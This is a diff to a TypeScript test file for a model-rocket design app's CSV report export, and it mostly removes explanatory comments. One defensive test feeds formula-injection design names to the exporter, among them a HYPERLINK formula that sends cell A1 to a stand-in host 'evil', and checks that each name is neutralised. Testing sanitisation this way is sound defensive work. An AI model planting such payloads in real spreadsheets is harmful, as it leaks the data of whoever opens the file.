@@ -10,8 +10,6 @@ import { NO_VALUE } from '../../../src/i18n/noValue';
 
 const info = {
   length: 0.9,
-  // Shorter than `length`, so 30.9 (the engine's figure) and 27.4 (the wrong
-  // (cp - cg) / length) are distinguishable in the assertion below.
   lengthAerodynamic: 0.8,
   refDiameter: 0.079,
   mass: 4.25,
@@ -83,8 +81,6 @@ describe('design CSV', () => {
   it('has the Rocket summary in the chosen units with dot decimals', () => {
     expect(rows).toContainEqual(['Rocket', 'Length', '90', 'cm']);
     expect(rows).toContainEqual(['Rocket', 'Stability (on pad)', '3.14', 'cal']);
-    // The kernel's own figure, over the aerodynamic length; (cp - cg) / length
-    // would be 27.4.
     expect(rows).toContainEqual(['Rocket', 'Stability (%)', '30.9', '%']);
     expect(rows).toContainEqual(['Rocket', 'CP', '162.9', 'cm']);
     expect(rows).toContainEqual(['Rocket', 'Normal-Force Slope (CNα)', '26.42', '/rad']);
@@ -95,7 +91,6 @@ describe('design CSV', () => {
       .trimEnd()
       .split('\r\n')
       .map((l) => l.split(','));
-    // 0.9 m = 35.4331 in to six significant figures; 4.25 kg = 149.914 oz.
     expect(imp).toContainEqual(['Rocket', 'Length', '35.4331', 'in']);
     expect(imp).toContainEqual(['Rocket', 'Mass (Loaded)', '149.914', 'oz']);
   });
@@ -115,9 +110,7 @@ describe('design CSV', () => {
     expect(c).toContain('Design,Name,"Big, Rocket",');
   });
 
-  // `model.name` is the <name> of an imported .ork, so it is untrusted: share
-  // someone a design and its name lands in a cell of the CSV they export.
-  // Excel and Sheets execute a cell that leads with = + - @.
+  // Security: `model.name` is from an imported .ork; spreadsheets execute a cell led by = + - @.
   it.each(['=HYPERLINK("http://evil/?"&A1,"Open")', '+1+1', '-1+1', '@SUM(A1)'])(
     'neutralizes a formula-triggering design name: %s',
     (name) => {
@@ -126,28 +119,15 @@ describe('design CSV', () => {
         .split('\r\n')
         .find((l) => l.startsWith('Design,Name,'))!
         .slice('Design,Name,'.length);
-      // Leads with an apostrophe, so the spreadsheet takes the cell as text.
-      // Quoting is separate and only kicks in for delimiters, so accept either
-      // `'=…` or `"'=…"`.
       expect(value.replace(/^"/, '').startsWith("'")).toBe(true);
     },
   );
 
   it('quotes a bare CR, which would otherwise split the record', () => {
-    // The file's own terminator is \r\n, so an unquoted lone \r reads as a row
-    // break to an RFC-4180 parser.
     const c = buildDesignCsv({ ...model, name: 'One\rTwo' }, METRIC_UNITS);
     expect(c).toContain('"One\rTwo"');
   });
 });
-
-/**
- * Every whole-rocket statistics table lists the same rows: the .ork
- * <designinfo> block, this CSV and the PDF. A finless design has no defined CP,
- * so OpenRocket omits CP, both stability rows and CNα, and a design with no
- * reference diameter has no fineness. The CSV omits the same rows, rather than
- * writing them (fineness as 0) where the .ork written beside it has none.
- */
 describe('design CSV rows for a finless design', () => {
   const finless = { ...info, cna: 0, refDiameter: 0 } as StaticInfo;
   const csv = buildDesignCsv({ ...model, whole: { label: 'F', info: finless }, stageSummaries: [] }, METRIC_UNITS);
@@ -224,9 +204,8 @@ describe('buildComponentCsv', () => {
     );
     const cells = nose!.split(',');
     expect(cells.slice(0, 5)).toEqual(['Sustainer', '0', 'Nose cone', 'Nose', 'Polystyrene']);
-    // A radius in the model is a diameter in the file: 12.5 mm is 2.5 cm across.
+    // A model radius is a diameter in the file.
     expect(Number(cells[9])).toBeCloseTo(2.5, 6);
-    // A figure the part does not have is blank.
     expect(cells[10]).toBe('');
   });
 
@@ -247,17 +226,12 @@ describe('buildComponentCsv', () => {
     expect(Number(cells[11])).toBeCloseTo(4, 6);
     expect(Number(cells[12])).toBeCloseTo(2.5, 6);
   });
-
-  /**
-   * Six significant figures, not a fixed count of decimals, which is wrong in
-   * one unit or another: three decimals write a 0.5 mm wall in meters as 0.001.
-   */
   it('keeps a thin wall in a large unit', () => {
     const cells = csv({ ...METRIC_UNITS, length: 'm' })[2]!.split(',');
     expect(cells[13]).toBe('0.0005');
   });
 
-  // A spreadsheet can read an exponent as text; `String` writes one below 1e-6.
+  // `String` writes an exponent below 1e-6, which a spreadsheet can read as text.
   it('writes a very small figure as a plain decimal', () => {
     const tiny: ReportModel = {
       ...parts,
@@ -271,12 +245,6 @@ describe('buildComponentCsv', () => {
       .split('\r\n');
     expect(row!.split(',').at(-1)).toBe('0.0000004');
   });
-
-  /**
-   * A chute's canopy and a shock cord's cord are a surface and a line material
-   * (the kernel's RecoveryDevice.getMaterial and ShockCord.getMaterial), so each
-   * density goes in the column of its own unit.
-   */
   it('writes a soft part density in the column of its kind', () => {
     const soft: ReportModel = {
       ...parts,
@@ -312,7 +280,6 @@ describe('buildComponentCsv', () => {
       .trimEnd()
       .split('\r\n')
       .map((r) => r.split(','));
-    // 0.067 kg/m² is 67 g/m²; 0.0018 kg/m is 1.8 g/m.
     expect(chute!.slice(4, 8)).toEqual(['Ripstop nylon', '', '67', '']);
     expect(cord!.slice(4, 8)).toEqual(['Elastic cord', '', '', '1.8']);
   });
@@ -383,12 +350,6 @@ describe('design CSV fin-set fields for unnamed fin sets', () => {
     }
   });
 });
-
-/**
- * A length in the report takes its decimals from its size in the unit shown,
- * as the app's own fields do: a BT-50 is 0.976 in across, which one decimal
- * would print as 1.0, and 24.8 mm needs no more than one.
- */
 describe('report lengths', () => {
   const page = (length: string) =>
     ({ t: i18n.getFixedT('en'), units: { ...METRIC_UNITS, length } }) as unknown as PdfPage;
